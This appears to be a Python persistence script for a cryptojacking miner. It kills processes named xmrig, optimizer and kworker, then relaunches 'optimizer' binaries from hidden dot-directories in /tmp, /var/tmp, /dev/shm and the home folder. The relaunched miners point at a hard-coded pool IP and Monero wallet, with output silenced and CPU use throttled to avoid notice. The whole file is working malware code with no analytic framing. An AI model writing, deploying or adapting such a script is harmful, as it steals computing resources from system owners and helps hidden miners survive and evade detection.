#!/usr/bin/env python3
import subprocess
import time

def restart_worker():
    # Kill existing miners
    subprocess.run("pkill -9 -f xmrig", shell=True)
    subprocess.run("pkill -9 -f optimizer", shell=True)
    subprocess.run("pkill -9 -f kworker", shell=True)
    
    time.sleep(2)
    
    # Find and restart from hidden locations
    paths = [
        "/tmp/.sys/optimizer",
        "/var/tmp/.cache/optimizer", 
        "/dev/shm/.x11/optimizer",
        "~/.local/.config/optimizer"
    ]
    
    for path in paths:
        cmd = f"nohup {path} -o 45.155.102.89:10128 -u 44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5 -p worker-1 --cpu-max-threads-hint=25 >/dev/null 2>&1 &"
        subprocess.run(cmd, shell=True)
    
    print("✓ Worker restarted")

if __name__ == "__main__":
    restart_worker()
